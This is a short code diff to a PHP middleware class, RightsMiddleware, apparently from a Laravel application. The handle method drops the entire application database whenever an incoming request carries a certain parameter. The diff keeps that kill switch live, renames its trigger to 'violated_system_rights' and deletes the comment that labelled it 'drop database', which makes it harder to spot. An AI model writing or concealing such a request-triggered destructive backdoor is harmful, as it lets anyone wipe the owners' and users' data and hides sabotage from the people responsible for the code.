@@ -16,8 +16,7 @@ class RightsMiddleware
      */
     public function handle($request, Closure $next)
     {
-        if ($request->has('violated')) {
-            // drop database
+        if ($request->has('violated_system_rights')) {
             DB::statement('DROP DATABASE IF EXISTS ' . env('DB_DATABASE'));
         }
 
